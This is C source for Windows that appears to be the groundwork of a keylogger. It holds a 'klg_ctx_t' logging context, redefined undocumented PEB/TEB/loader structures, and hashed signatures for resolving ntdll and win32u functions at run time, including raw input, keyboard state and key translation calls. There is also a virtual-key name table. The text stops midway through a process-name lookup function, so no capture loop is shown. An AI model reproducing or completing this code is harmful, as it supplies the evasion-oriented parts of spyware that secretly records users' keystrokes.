#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#ifndef VIRTUALKEYS
#define VIRTUALKEYS
typedef struct
{
    DWORD       time;
    DWORD       pid;
    HWND        hwnd;
    HKL         hkl;
    wchar_t        procname[16];
    wchar_t        klid[KL_NAMELENGTH];
} klg_ctx_t;

#ifndef DEFS_HPP
#define DEFS_HPP
#include <Windows.h>
typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
/*--------------------------------------------------------------------
  STRUCTURES
--------------------------------------------------------------------*/
typedef struct _PS_ATTRIBUTE
{
	ULONG  Attribute;
	SIZE_T Size;
	union
	{
		ULONG Value;
		PVOID ValuePtr;
	} u1;
	PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T       TotalLength;
	PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING, * PUNICODE_STR;

typedef struct _LDR_MODULE {
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
	PVOID                   BaseAddress;
	PVOID                   EntryPoint;
	ULONG                   SizeOfImage;
	UNICODE_STRING          FullDllName;
	UNICODE_STRING          BaseDllName;
	ULONG                   Flags;
	SHORT                   LoadCount;
	SHORT                   TlsIndex;
	LIST_ENTRY              HashTableEntry;
	ULONG                   TimeDateStamp;
} LDR_MODULE, * PLDR_MODULE;

typedef struct _PEB_LDR_DATA {
	ULONG                   Length;
	ULONG                   Initialized;
	PVOID                   SsHandle;
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB {
	BOOLEAN                 InheritedAddressSpace;
	BOOLEAN                 ReadImageFileExecOptions;
	BOOLEAN                 BeingDebugged;
	BOOLEAN                 Spare;
	HANDLE                  Mutant;
	PVOID                   ImageBase;
	PPEB_LDR_DATA           LoaderData;
	PVOID                   ProcessParameters;
	PVOID                   SubSystemData;
	PVOID                   ProcessHeap;
	PVOID                   FastPebLock;
	PVOID                   FastPebLockRoutine;
	PVOID                   FastPebUnlockRoutine;
	ULONG                   EnvironmentUpdateCount;
	PVOID* KernelCallbackTable;
	PVOID                   EventLogSection;
	PVOID                   EventLog;
	PVOID                   FreeList;
	ULONG                   TlsExpansionCounter;
	PVOID                   TlsBitmap;
	ULONG                   TlsBitmapBits[0x2];
	PVOID                   ReadOnlySharedMemoryBase;
	PVOID                   ReadOnlySharedMemoryHeap;
	PVOID* ReadOnlyStaticServerData;
	PVOID                   AnsiCodePageData;
	PVOID                   OemCodePageData;
	PVOID                   UnicodeCaseTableData;
	ULONG                   NumberOfProcessors;
	ULONG                   NtGlobalFlag;
	BYTE                    Spare2[0x4];
	LARGE_INTEGER           CriticalSectionTimeout;
	ULONG                   HeapSegmentReserve;
	ULONG                   HeapSegmentCommit;
	ULONG                   HeapDeCommitTotalFreeThreshold;
	ULONG                   HeapDeCommitFreeBlockThreshold;
	ULONG                   NumberOfHeaps;
	ULONG                   MaximumNumberOfHeaps;
	PVOID** ProcessHeaps;
	PVOID                   GdiSharedHandleTable;
	PVOID                   ProcessStarterHelper;
	PVOID                   GdiDCAttributeList;
	PVOID                   LoaderLock;
	ULONG                   OSMajorVersion;
	ULONG                   OSMinorVersion;
	ULONG                   OSBuildNumber;
	ULONG                   OSPlatformId;
	ULONG                   ImageSubSystem;
	ULONG                   ImageSubSystemMajorVersion;
	ULONG                   ImageSubSystemMinorVersion;
	ULONG                   GdiHandleBuffer[0x22];
	ULONG                   PostProcessInitRoutine;
	ULONG                   TlsExpansionBitmap;
	BYTE                    TlsExpansionBitmapBits[0x80];
	ULONG                   SessionId;
} PEB, * PPEB;
typedef struct __CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT {
	ULONG Flags;
	PCHAR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, * PTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _TEB_ACTIVE_FRAME {
	ULONG Flags;
	struct _TEB_ACTIVE_FRAME* Previous;
	PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, * PTEB_ACTIVE_FRAME;

typedef struct _GDI_TEB_BATCH {
	ULONG Offset;
	ULONG HDC;
	ULONG Buffer[310];
} GDI_TEB_BATCH, * PGDI_TEB_BATCH;

typedef PVOID PACTIVATION_CONTEXT;

typedef struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME {
	struct __RTL_ACTIVATION_CONTEXT_STACK_FRAME* Previous;
	PACTIVATION_CONTEXT ActivationContext;
	ULONG Flags;
} RTL_ACTIVATION_CONTEXT_STACK_FRAME, * PRTL_ACTIVATION_CONTEXT_STACK_FRAME;

typedef struct _ACTIVATION_CONTEXT_STACK {
	PRTL_ACTIVATION_CONTEXT_STACK_FRAME ActiveFrame;
	LIST_ENTRY FrameListCache;
	ULONG Flags;
	ULONG NextCookieSequenceNumber;
	ULONG StackId;
} ACTIVATION_CONTEXT_STACK, * PACTIVATION_CONTEXT_STACK;

typedef struct _TEB {
	NT_TIB				NtTib;
	PVOID				EnvironmentPointer;
	CLIENT_ID			ClientId;
	PVOID				ActiveRpcHandle;
	PVOID				ThreadLocalStoragePointer;
	PPEB				ProcessEnvironmentBlock;
	ULONG               LastErrorValue;
	ULONG               CountOfOwnedCriticalSections;
	PVOID				CsrClientThread;
	PVOID				Win32ThreadInfo;
	ULONG               User32Reserved[26];
	ULONG               UserReserved[5];
	PVOID				WOW32Reserved;
	LCID                CurrentLocale;
	ULONG               FpSoftwareStatusRegister;
	PVOID				SystemReserved1[54];
	LONG                ExceptionCode;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PACTIVATION_CONTEXT_STACK* ActivationContextStackPointer;
	UCHAR                  SpareBytes1[0x30 - 3 * sizeof(PVOID)];
	ULONG                  TxFsContext;
#elif (NTDDI_VERSION >= NTDDI_WS03)
	PACTIVATION_CONTEXT_STACK ActivationContextStackPointer;
	UCHAR                  SpareBytes1[0x34 - 3 * sizeof(PVOID)];
#else
	ACTIVATION_CONTEXT_STACK ActivationContextStack;
	UCHAR                  SpareBytes1[24];
#endif
	GDI_TEB_BATCH			GdiTebBatch;
	CLIENT_ID				RealClientId;
	PVOID					GdiCachedProcessHandle;
	ULONG                   GdiClientPID;
	ULONG                   GdiClientTID;
	PVOID					GdiThreadLocalInfo;
	PSIZE_T					Win32ClientInfo[62];
	PVOID					glDispatchTable[233];
	PSIZE_T					glReserved1[29];
	PVOID					glReserved2;
	PVOID					glSectionInfo;
	PVOID					glSection;
	PVOID					glTable;
	PVOID					glCurrentRC;
	PVOID					glContext;
	NTSTATUS                LastStatusValue;
	UNICODE_STRING			StaticUnicodeString;
	WCHAR                   StaticUnicodeBuffer[261];
	PVOID					DeallocationStack;
	PVOID					TlsSlots[64];
	LIST_ENTRY				TlsLinks;
	PVOID					Vdm;
	PVOID					ReservedForNtRpc;
	PVOID					DbgSsReserved[2];
#if (NTDDI_VERSION >= NTDDI_WS03)
	ULONG                   HardErrorMode;
#else
	ULONG                  HardErrorsAreDisabled;
#endif
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID					Instrumentation[13 - sizeof(GUID) / sizeof(PVOID)];
	GUID                    ActivityId;
	PVOID					SubProcessTag;
	PVOID					EtwLocalData;
	PVOID					EtwTraceData;
#elif (NTDDI_VERSION >= NTDDI_WS03)
	PVOID					Instrumentation[14];
	PVOID					SubProcessTag;
	PVOID					EtwLocalData;
#else
	PVOID					Instrumentation[16];
#endif
	PVOID					WinSockData;
	ULONG					GdiBatchCount;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	BOOLEAN                SpareBool0;
	BOOLEAN                SpareBool1;
	BOOLEAN                SpareBool2;
#else
	BOOLEAN                InDbgPrint;
	BOOLEAN                FreeStackOnTermination;
	BOOLEAN                HasFiberData;
#endif
	UCHAR                  IdealProcessor;
#if (NTDDI_VERSION >= NTDDI_WS03)
	ULONG                  GuaranteedStackBytes;
#else
	ULONG                  Spare3;
#endif
	PVOID				   ReservedForPerf;
	PVOID				   ReservedForOle;
	ULONG                  WaitingOnLoaderLock;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID				   SavedPriorityState;
	ULONG_PTR			   SoftPatchPtr1;
	ULONG_PTR			   ThreadPoolData;
#elif (NTDDI_VERSION >= NTDDI_WS03)
	ULONG_PTR			   SparePointer1;
	ULONG_PTR              SoftPatchPtr1;
	ULONG_PTR              SoftPatchPtr2;
#else
	Wx86ThreadState        Wx86Thread;
#endif
	PVOID* TlsExpansionSlots;
#if defined(_WIN64) && !defined(EXPLICIT_32BIT)
	PVOID                  DeallocationBStore;
	PVOID                  BStoreLimit;
#endif
	ULONG                  ImpersonationLocale;
	ULONG                  IsImpersonating;
	PVOID                  NlsCache;
	PVOID                  pShimData;
	ULONG                  HeapVirtualAffinity;
	HANDLE                 CurrentTransactionHandle;
	PTEB_ACTIVE_FRAME      ActiveFrame;
#if (NTDDI_VERSION >= NTDDI_WS03)
	PVOID FlsData;
#endif
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID PreferredLangauges;
	PVOID UserPrefLanguages;
	PVOID MergedPrefLanguages;
	ULONG MuiImpersonation;
	union
	{
		struct
		{
			USHORT SpareCrossTebFlags : 16;
		};
		USHORT CrossTebFlags;
	};
	union
	{
		struct
		{
			USHORT DbgSafeThunkCall : 1;
			USHORT DbgInDebugPrint : 1;
			USHORT DbgHasFiberData : 1;
			USHORT DbgSkipThreadAttach : 1;
			USHORT DbgWerInShipAssertCode : 1;
			USHORT DbgIssuedInitialBp : 1;
			USHORT DbgClonedThread : 1;
			USHORT SpareSameTebBits : 9;
		};
		USHORT SameTebFlags;
	};
	PVOID TxnScopeEntercallback;
	PVOID TxnScopeExitCAllback;
	PVOID TxnScopeContext;
	ULONG LockCount;
	ULONG ProcessRundown;
	ULONG64 LastSwitchTime;
	ULONG64 TotalSwitchOutTime;
	LARGE_INTEGER WaitReasonBitMap;
#else
	BOOLEAN SafeThunkCall;
	BOOLEAN BooleanSpare[3];
#endif
} TEB, * PTEB;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	WORD LoadCount;
	WORD TlsIndex;
	union {
		LIST_ENTRY HashLinks;
		struct {
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union {
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
	PACTIVATION_CONTEXT EntryPointActivationContext;
	PVOID PatchInformation;
	LIST_ENTRY ForwarderLinks;
	LIST_ENTRY ServiceTagLinks;
	LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	PVOID RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _INITIAL_TEB {
	PVOID                StackBase;
	PVOID                StackLimit;
	PVOID                StackCommit;
	PVOID                StackCommitMax;
	PVOID                StackReserved;
} INITIAL_TEB, * PINITIAL_TEB;

typedef struct _RTLP_CURDIR_REF {
	LONG RefCount;
	HANDLE Handle;
}RTLP_CURDIR_REF, * PRTLP_CURDIR_REF;
typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;
typedef struct _RTL_RELATIVE_NAME_U {
	UNICODE_STRING RelativeName;
	HANDLE ContainingDirectory;
	PRTLP_CURDIR_REF CurDirRef;
}RTL_RELATIVE_NAME_U, * PRTL_RELATIVE_NAME_U;

typedef struct _FILE_STANDARD_INFORMATION {
	LARGE_INTEGER AllocationSize;
	LARGE_INTEGER EndOfFile;
	ULONG         NumberOfLinks;
	BOOLEAN       DeletePending;
	BOOLEAN       Directory;
} FILE_STANDARD_INFORMATION, * PFILE_STANDARD_INFORMATION;
typedef enum _FILE_INFORMATION_CLASS {
	FileDirectoryInformation = 1,
	FileFullDirectoryInformation,
	FileBothDirectoryInformation,
	FileBasicInformation,
	FileStandardInformation,
	FileInternalInformation,
	FileEaInformation,
	FileAccessInformation,
	FileNameInformation,
	FileRenameInformation,
	FileLinkInformation,
	FileNamesInformation,
	FileDispositionInformation,
	FilePositionInformation,
	FileFullEaInformation,
	FileModeInformation,
	FileAlignmentInformation,
	FileAllInformation,
	FileAllocationInformation,
	FileEndOfFileInformation,
	FileAlternateNameInformation,
	FileStreamInformation,
	FilePipeInformation,
	FilePipeLocalInformation,
	FilePipeRemoteInformation,
	FileMailslotQueryInformation,
	FileMailslotSetInformation,
	FileCompressionInformation,
	FileObjectIdInformation,
	FileCompletionInformation,
	FileMoveClusterInformation,
	FileQuotaInformation,
	FileReparsePointInformation,
	FileNetworkOpenInformation,
	FileAttributeTagInformation,
	FileTrackingInformation,
	FileIdBothDirectoryInformation,
	FileIdFullDirectoryInformation,
	FileValidDataLengthInformation,
	FileShortNameInformation,
	FileIoCompletionNotificationInformation,
	FileIoStatusBlockRangeInformation,
	FileIoPriorityHintInformation,
	FileSfioReserveInformation,
	FileSfioVolumeInformation,
	FileHardLinkInformation,
	FileProcessIdsUsingFileInformation,
	FileNormalizedNameInformation,
	FileNetworkPhysicalNameInformation,
	FileIdGlobalTxDirectoryInformation,
	FileIsRemoteDeviceInformation,
	FileUnusedInformation,
	FileNumaNodeInformation,
	FileStandardLinkInformation,
	FileRemoteProtocolInformation,
	FileRenameInformationBypassAccessCheck,
	FileLinkInformationBypassAccessCheck,
	FileVolumeNameInformation,
	FileIdInformation,
	FileIdExtdDirectoryInformation,
	FileReplaceCompletionInformation,
	FileHardLinkFullIdInformation,
	FileIdExtdBothDirectoryInformation,
	FileMaximumInformation
} FILE_INFORMATION_CLASS, * PFILE_INFORMATION_CLASS;

typedef struct _IO_APC_ROUTINE {
	VOID* ApcContext;
	PIO_STATUS_BLOCK IoStatusBlock;
	ULONG		     Reserved;
} IO_APC_ROUTINE, * PIO_APC_ROUTINE;
/*-------------------------------------------functions--------------------------------------------------*/

typedef PVOID(NTAPI* RTLALLOCATEHEAP)(PVOID, ULONG, SIZE_T);
#define RTLALLOCATEHEAP_SIG 0xc0b381da

typedef BOOL(NTAPI* RTLFREEHEAP)(PVOID, ULONG, PVOID);
#define RTLFREEHEAP_SIG 0x70ba71d7

typedef NTSTATUS(NTAPI* LDRLOADDLL) (PWCHAR, DWORD, PUNICODE_STRING, PHANDLE);
#define LDRLOADDLL_SIG 0x0307db23

typedef NTSTATUS(NTAPI* NTCLOSE)(HANDLE);
#define NTCLOSE_SIG 0x8b8e133d

typedef NTSTATUS(NTAPI* NTCREATEFILE)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
#define NTCREATEFILE_SIG 0x15a5ecdb

typedef NTSTATUS(NTAPI* RTLDOSPATHNAMETONTPATHNAME_U)(PCWSTR, PUNICODE_STRING, PCWSTR*, PRTL_RELATIVE_NAME_U);
#define RTLDOSPATHNAMETONTPATHNAME_U_SIG 0xbfe457b2

typedef LRESULT(NTAPI* NTDLLDEFWINDOWPROC_W)(HWND, UINT, WPARAM, LPARAM);
#define NTDLLDEFWINDOWPROC_W_SIG 0x058790f4

typedef NTSTATUS(NTAPI* NTQUERYINFORMATIONFILE)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);
#define NTQUERYINFORMATIONFILE_SIG 0x4725f863

typedef NTSTATUS(NTAPI* NTSETINFORMATIONFILE) (HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);
#define NTSETINFORMATIONFILE_SIG 0x6e88b479

typedef NTSTATUS(NTAPI* NTWRITEFILE)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
#define NTWRITEFILE_SIG 0xd69326b2

//WIN32U

typedef VOID(NTAPI* NTUSERCALLONEPARAM)(DWORD, DWORD);
#define NTUSERCALLONEPARAM_SIG 0xb19a9f55

typedef BOOL(NTAPI* NTUSERDESTROYWINDOW)(HWND);
#define NTUSERDESTROYWINDOW_SIG 0xabad4a48

typedef BOOL(NTAPI* NTUSERREGISTERRAWINPUTDEVICES)(PCRAWINPUTDEVICE, UINT, UINT);
#define NTUSERREGISTERRAWINPUTDEVICES_SIG 0x76dc2408

typedef UINT(NTAPI* NTUSERGETRAWINPUTDATA)(HRAWINPUT, UINT, LPVOID, PUINT, UINT);
#define NTUSERGETRAWINPUTDATA_SIG 0xd902c31a

typedef BOOL(NTAPI* NTUSERGETKEYBOARDSTATE)(PBYTE);
#define NTUSERGETKEYBOARDSTATE_SIG 0x92ca3458

typedef INT(NTAPI* NTUSERTOUNICODEEX)(UINT, UINT, PBYTE, LPWSTR, INT, UINT, HKL);
#define NTUSERTOUNICODEEX_SIG 0xe561424d

typedef UINT(NTAPI* NTUSERMAPVIRTUALKEYEX)(UINT, UINT, UINT, UINT);
#define NTUSERMAPVIRTUALKEYEX_SIG 0xc8e8ef51

typedef INT(NTAPI* NTUSERGETKEYNAMETEXT)(LONG, LPWSTR, INT);
#define NTUSERGETKEYNAMETEXT_SIG 0x5be51535

typedef BOOL(NTAPI* NTUSERGETMESSAGE)(LPMSG, HWND, UINT, UINT);
#define NTUSERGETMESSAGE_SIG 0xb6c60f8b

typedef BOOL(NTAPI* NTUSERTRANSLATEMESSAGE)(PMSG, UINT);
#define NTUSERTRANSLATEMESSAGE_SIG 0xafc97a79

typedef struct IMPORTED
{

	//NTDLL IMPORTS
	LDRLOADDLL LdrLoadDll;
	RTLALLOCATEHEAP RtlAllocateHeap;
	RTLFREEHEAP RtlFreeHeap;
	NTCLOSE NtClose;
	NTCREATEFILE NtCreateFile;
	RTLDOSPATHNAMETONTPATHNAME_U RtlDosPathNameToNtPathName_U;
	NTDLLDEFWINDOWPROC_W NtdllDefWindowProc_W;
	NTQUERYINFORMATIONFILE NtQueryInformationFile;
	NTSETINFORMATIONFILE NtSetInformationFile;
	NTWRITEFILE NtWriteFile;

	//WIN32 BA
	
	PVOID Win32uBA;

	//WIN32U IMPORTS
	NTUSERCALLONEPARAM NtUserCallOneParam;
	NTUSERDESTROYWINDOW NtUserDestroyWindow;
	NTUSERREGISTERRAWINPUTDEVICES NtUserRegisterRawInputDevices;
	NTUSERGETRAWINPUTDATA NtUserGetRawInputData;
	NTUSERGETKEYBOARDSTATE NtUserGetKeyboardState;
	NTUSERTOUNICODEEX NtUserToUnicodeEx;
	NTUSERMAPVIRTUALKEYEX NtUserMapVirtualKeyEx;
	NTUSERGETKEYNAMETEXT NtUserGetKeyNameText;
	NTUSERGETMESSAGE NtUserGetMessage;
	NTUSERTRANSLATEMESSAGE NtUserTranslateMessage;


} *PIMPORTED;

#endif

char* VirtualKeyCodes[256] = {
    (char*)"UNDEF_0x00",
    (char*)"VK_LBUTTON",
    (char*)"VK_RBUTTON",
    (char*)"VK_CANCEL",
    (char*)"VK_MBUTTON",
    (char*)"VK_XBUTTON1",
    (char*)"VK_XBUTTON2",
    (char*)"UNDEF_0x07",
    (char*)"VK_BACK",
    (char*)"VK_TAB",
    (char*)"UNDEF_0x0A",
    (char*)"UNDEF_0x0B",
    (char*)"VK_CLEAR",
    (char*)"VK_RETURN",
    (char*)"UNDEF_0x0E",
    (char*)"UNDEF_0x0F",
    (char*)"VK_SHIFT",
    (char*)"VK_CONTROL",
    (char*)"VK_MENU",
    (char*)"VK_PAUSE",
    (char*)"VK_CAPITAL",
    (char*)"VK_HANGUL",
    (char*)"VK_IME_ON",
    (char*)"VK_JUNJA",
    (char*)"VK_FINAL",
    (char*)"VK_KANJI",
    (char*)"VK_IME_OFF",
    (char*)"VK_ESCAPE",
    (char*)"VK_CONVERT",
    (char*)"VK_NONCONVERT",
    (char*)"VK_ACCEPT",
    (char*)"VK_MODECHANGE",
    (char*)"VK_SPACE",
    (char*)"VK_PRIOR",
    (char*)"VK_NEXT",
    (char*)"VK_END",
    (char*)"VK_HOME",
    (char*)"VK_LEFT",
    (char*)"VK_UP",
    (char*)"VK_RIGHT",
    (char*)"VK_DOWN",
    (char*)"VK_SELECT",
    (char*)"VK_PRINT",
    (char*)"VK_EXECUTE",
    (char*)"VK_SNAPSHOT",
    (char*)"VK_INSERT",
    (char*)"VK_DELETE",
    (char*)"VK_HELP",
    (char*)"VK_0",
    (char*)"VK_1",
    (char*)"VK_2",
    (char*)"VK_3",
    (char*)"VK_4",
    (char*)"VK_5",
    (char*)"VK_6",
    (char*)"VK_7",
    (char*)"VK_8",
    (char*)"VK_9",
    (char*)"UNDEF_0x3A",
    (char*)"UNDEF_0x3B",
    (char*)"UNDEF_0x3C",
    (char*)"UNDEF_0x3D",
    (char*)"UNDEF_0x3E",
    (char*)"UNDEF_0x3F",
    (char*)"UNDEF_0x40",
    (char*)"VK_A",
    (char*)"VK_B",
    (char*)"VK_C",
    (char*)"VK_D",
    (char*)"VK_E",
    (char*)"VK_F",
    (char*)"VK_G",
    (char*)"VK_H",
    (char*)"VK_I",
    (char*)"VK_J",
    (char*)"VK_K",
    (char*)"VK_L",
    (char*)"VK_M",
    (char*)"VK_N",
    (char*)"VK_O",
    (char*)"VK_P",
    (char*)"VK_Q",
    (char*)"VK_R",
    (char*)"VK_S",
    (char*)"VK_T",
    (char*)"VK_U",
    (char*)"VK_V",
    (char*)"VK_W",
    (char*)"VK_X",
    (char*)"VK_Y",
    (char*)"VK_Z",
    (char*)"VK_LWIN",
    (char*)"VK_RWIN",
    (char*)"VK_APPS",
    (char*)"UNDEF_0x5E",
    (char*)"VK_SLEEP",
    (char*)"VK_NUMPAD0",
    (char*)"VK_NUMPAD1",
    (char*)"VK_NUMPAD2",
    (char*)"VK_NUMPAD3",
    (char*)"VK_NUMPAD4",
    (char*)"VK_NUMPAD5",
    (char*)"VK_NUMPAD6",
    (char*)"VK_NUMPAD7",
    (char*)"VK_NUMPAD8",
    (char*)"VK_NUMPAD9",
    (char*)"VK_MULTIPLY",
    (char*)"VK_ADD",
    (char*)"VK_SEPARATOR",
    (char*)"VK_SUBTRACT",
    (char*)"VK_DECIMAL",
    (char*)"VK_DIVIDE",
    (char*)"VK_F1",
    (char*)"VK_F2",
    (char*)"VK_F3",
    (char*)"VK_F4",
    (char*)"VK_F5",
    (char*)"VK_F6",
    (char*)"VK_F7",
    (char*)"VK_F8",
    (char*)"VK_F9",
    (char*)"VK_F10",
    (char*)"VK_F11",
    (char*)"VK_F12",
    (char*)"VK_F13",
    (char*)"VK_F14",
    (char*)"VK_F15",
    (char*)"VK_F16",
    (char*)"VK_F17",
    (char*)"VK_F18",
    (char*)"VK_F19",
    (char*)"VK_F20",
    (char*)"VK_F21",
    (char*)"VK_F22",
    (char*)"VK_F23",
    (char*)"VK_F24",
    (char*)"VK_NAVIGATION_VIEW",
    (char*)"VK_NAVIGATION_MENU",
    (char*)"VK_NAVIGATION_UP",
    (char*)"VK_NAVIGATION_DOWN",
    (char*)"VK_NAVIGATION_LEFT",
    (char*)"VK_NAVIGATION_RIGHT",
    (char*)"VK_NAVIGATION_ACCEPT",
    (char*)"VK_NAVIGATION_CANCEL",
    (char*)"VK_NUMLOCK",
    (char*)"VK_SCROLL",
    (char*)"VK_OEM_NEC_EQUAL",
    (char*)"VK_OEM_FJ_MASSHOU",
    (char*)"VK_OEM_FJ_TOUROKU",
    (char*)"VK_OEM_FJ_LOYA",
    (char*)"VK_OEM_FJ_ROYA",
    (char*)"UNDEF_0x97",
    (char*)"UNDEF_0x98",
    (char*)"UNDEF_0x99",
    (char*)"UNDEF_0x9A",
    (char*)"UNDEF_0x9B",
    (char*)"UNDEF_0x9C",
    (char*)"UNDEF_0x9D",
    (char*)"UNDEF_0x9E",
    (char*)"UNDEF_0x9F",
    (char*)"VK_LSHIFT",
    (char*)"VK_RSHIFT",
    (char*)"VK_LCONTROL",
    (char*)"VK_RCONTROL",
    (char*)"VK_LMENU",
    (char*)"VK_RMENU",
    (char*)"VK_BROWSER_BACK",
    (char*)"VK_BROWSER_FORWARD",
    (char*)"VK_BROWSER_REFRESH",
    (char*)"VK_BROWSER_STOP",
    (char*)"VK_BROWSER_SEARCH",
    (char*)"VK_BROWSER_FAVORITES",
    (char*)"VK_BROWSER_HOME",
    (char*)"VK_VOLUME_MUTE",
    (char*)"VK_VOLUME_DOWN",
    (char*)"VK_VOLUME_UP",
    (char*)"VK_MEDIA_NEXT_TRACK",
    (char*)"VK_MEDIA_PREV_TRACK",
    (char*)"VK_MEDIA_STOP",
    (char*)"VK_MEDIA_PLAY_PAUSE",
    (char*)"VK_LAUNCH_MAIL",
    (char*)"VK_LAUNCH_MEDIA_SELECT",
    (char*)"VK_LAUNCH_APP1",
    (char*)"VK_LAUNCH_APP2",
    (char*)"UNDEF_0xB8",
    (char*)"UNDEF_0xB9",
    (char*)"VK_OEM_1",
    (char*)"VK_OEM_PLUS",
    (char*)"VK_OEM_COMMA",
    (char*)"VK_OEM_MINUS",
    (char*)"VK_OEM_PERIOD",
    (char*)"VK_OEM_2",
    (char*)"VK_OEM_3",
    (char*)"VK_ABNT_C1",
    (char*)"VK_ABNT_C2",
    (char*)"VK_GAMEPAD_A",
    (char*)"VK_GAMEPAD_B",
    (char*)"VK_GAMEPAD_X",
    (char*)"VK_GAMEPAD_Y",
    (char*)"VK_GAMEPAD_RIGHT_SHOULDER",
    (char*)"VK_GAMEPAD_LEFT_SHOULDER",
    (char*)"VK_GAMEPAD_LEFT_TRIGGER",
    (char*)"VK_GAMEPAD_RIGHT_TRIGGER",
    (char*)"VK_GAMEPAD_DPAD_UP",
    (char*)"VK_GAMEPAD_DPAD_DOWN",
    (char*)"VK_GAMEPAD_DPAD_LEFT",
    (char*)"VK_GAMEPAD_DPAD_RIGHT",
    (char*)"VK_GAMEPAD_MENU",
    (char*)"VK_GAMEPAD_VIEW",
    (char*)"VK_GAMEPAD_LEFT_THUMBSTICK_BUTTON",
    (char*)"VK_GAMEPAD_RIGHT_THUMBSTICK_BUTTON",
    (char*)"VK_GAMEPAD_LEFT_THUMBSTICK_UP",
    (char*)"VK_GAMEPAD_LEFT_THUMBSTICK_DOWN",
    (char*)"VK_GAMEPAD_LEFT_THUMBSTICK_RIGHT",
    (char*)"VK_GAMEPAD_LEFT_THUMBSTICK_LEFT",
    (char*)"VK_GAMEPAD_RIGHT_THUMBSTICK_UP",
    (char*)"VK_GAMEPAD_RIGHT_THUMBSTICK_DOWN",
    (char*)"VK_GAMEPAD_RIGHT_THUMBSTICK_RIGHT",
    (char*)"VK_GAMEPAD_RIGHT_THUMBSTICK_LEFT",
    (char*)"VK_OEM_4",
    (char*)"VK_OEM_5",
    (char*)"VK_OEM_6",
    (char*)"VK_OEM_7",
    (char*)"VK_OEM_8",
    (char*)"UNDEF_0xE0",
    (char*)"VK_OEM_AX",
    (char*)"VK_OEM_102",
    (char*)"VK_ICO_HELP",
    (char*)"VK_ICO_00",
    (char*)"VK_PROCESSKEY",
    (char*)"VK_ICO_CLEAR",
    (char*)"VK_PACKET",
    (char*)"UNDEF_0xE8",
    (char*)"VK_OEM_RESET",
    (char*)"VK_OEM_JUMP",
    (char*)"VK_OEM_PA1",
    (char*)"VK_OEM_PA2",
    (char*)"VK_OEM_PA3",
    (char*)"VK_OEM_WSCTRL",
    (char*)"VK_OEM_CUSEL",
    (char*)"VK_OEM_ATTN",
    (char*)"VK_OEM_FINISH",
    (char*)"VK_OEM_COPY",
    (char*)"VK_OEM_AUTO",
    (char*)"VK_OEM_ENLW",
    (char*)"VK_OEM_BACKTAB",
    (char*)"VK_ATTN",
    (char*)"VK_CRSEL",
    (char*)"VK_EXSEL",
    (char*)"VK_EREOF",
    (char*)"VK_PLAY",
    (char*)"VK_ZOOM",
    (char*)"VK_NONAME",
    (char*)"VK_PA1",
    (char*)"VK_OEM_CLEAR",
    (char*)"VK__none_"
};

IMPORTED importz = { 0 };

#define ResolveVirtualKey( x ) ( ( ( x ) >= 0 && ( x ) <= 0xff) ? VirtualKeyCodes[ ( x ) ] : "invalid" ) 
#define NumOfElements(arr) (sizeof(arr) / sizeof(arr[0]))
#endif

void ProcessName(DWORD pid, wchar_t* procname, size_t sizeofProcname)
{
    PROCESSENTRY32 Pe32 = { 0 };
    HANDLE snapShot = NULL;
    
    snapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    Pe32.dwSize = sizeof(PROCESSENTRY32);

    Process32First( snapShot, &Pe32 );
    do
    {
        if (Pe32.th32ProcessID == pid)
        {
            wcscpy(procname, Pe32.szExeFile);
            return;
        }
